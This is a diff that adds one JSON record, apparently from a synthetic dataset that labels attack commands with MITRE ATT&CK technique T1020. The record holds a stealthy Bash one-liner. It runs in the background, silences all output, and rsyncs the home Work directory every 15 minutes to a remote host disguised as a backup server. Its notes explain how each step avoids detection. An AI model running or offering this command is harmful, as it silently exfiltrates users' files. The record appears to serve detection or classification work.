@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup bash -c 'while sleep 900; do rsync -azq --delete --exclude=\\*.tmp --exclude=\\*.cache $HOME/Work/ backup@updates.example.org:.local/.w/$HOSTNAME/; done' >/dev/null 2>&1 &",
+  "explanation": "Automates periodic exfiltration every 15 minutes using rsync to continuously mirror a working directory to a remote host, fitting T1020\u2019s automated data transfer pattern.",
+  "rationale_steps": [
+    "Establish a loop to automate regular transfers.",
+    "Mirror contents with --delete to maintain a clean remote mirror.",
+    "Exclude noisy/temp files to reduce volume and detection.",
+    "Run with nohup and redirect all output to /dev/null for stealth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-34cdda1d",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
